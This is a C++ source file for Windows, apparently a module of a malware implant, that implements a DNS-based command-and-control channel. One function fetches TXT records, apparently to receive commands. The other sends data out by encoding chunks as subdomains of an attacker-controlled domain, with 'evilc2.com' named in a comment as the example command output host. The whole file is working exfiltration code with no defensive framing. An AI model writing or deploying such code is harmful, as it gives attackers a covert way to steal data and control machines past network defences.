#include "dns_utils.h"
#include <windows.h>
#include <windns.h>
#include <string>

#pragma comment(lib, "dnsapi.lib")

// === Query TXT record via DnsQuery ===
std::string dnsQueryTXT(const std::string& domain) {
    DNS_RECORD* pDnsRecord = nullptr;
    std::string result;

    if (DnsQuery_A(domain.c_str(), DNS_TYPE_TEXT, DNS_QUERY_STANDARD,
        nullptr, &pDnsRecord, nullptr) == 0) {
        if (pDnsRecord && pDnsRecord->Data.TXT.pStringArray) {
            result = (char*)pDnsRecord->Data.TXT.pStringArray[0];
        }
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }

    return result;
}

// === Send outbound A record query to exfil a chunk ===
bool dnsSendChunk(const std::string& domain, const std::string& chunk) {
    std::string fullQuery = chunk + "." + domain;  // e.g., chunk0.session.cmdout.evilc2.com
    DNS_RECORD* pDnsRecord = nullptr;

    DNS_STATUS status = DnsQuery_A(fullQuery.c_str(), DNS_TYPE_A, DNS_QUERY_STANDARD,
        nullptr, &pDnsRecord, nullptr);

    if (pDnsRecord) {
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }

    return (status == 0);
}
